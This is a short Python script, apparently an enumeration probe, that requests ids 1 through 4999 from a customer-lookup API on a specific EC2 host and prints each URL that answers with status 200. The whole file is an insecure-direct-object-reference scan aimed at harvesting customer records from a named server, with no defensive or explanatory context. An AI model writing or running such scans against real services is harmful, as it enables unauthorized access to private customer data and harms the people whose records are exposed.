import requests

for i in range(1,5000):

    URL = "http://ec2-3-111-8-121.ap-south-1.compute.amazonaws.com/api/get-customer?id="+str(i)
    r = requests.get(url= URL)

    if r.status_code == 200:
        print(URL)
        print(r)